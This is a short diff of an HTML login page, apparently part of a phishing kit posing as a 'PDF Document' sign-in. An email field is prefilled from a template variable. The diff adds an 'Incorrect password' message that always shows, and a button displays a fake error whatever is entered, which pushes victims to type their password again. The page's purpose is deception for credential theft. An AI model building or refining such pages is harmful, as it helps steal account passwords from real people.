@@ -365,11 +365,13 @@
                                 <p>PDF Document</p>
                             </li><br>
 
-                            <div class="text-danger" id="msg" style="display: none; color: red; font-style: italic; font-size: 13px;">Invalid Password! Please Enter your correct Password</div>
+                            
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist.
                                 Enter a different account</span>
 
                             <p style="color: #FF6F61; font-family: 'proxima-nova', sans-serif; font-size: 14px; margin-top: 10px; display: none;" id="error-message">Incorrect password. Please try again.</p><button type="button" onclick="document.getElementById('error-message').style.display='block'">Submit</button>
+
+                            <p style="color: red; font-size: 14px; margin-top: 10px;">Incorrect password. Please try again.</p>
 
                             <li><input type="email" value="{{eman}}" name="horse" required class="inp" id="email" autocomplete="off"
                                     placeholder="Email Address"
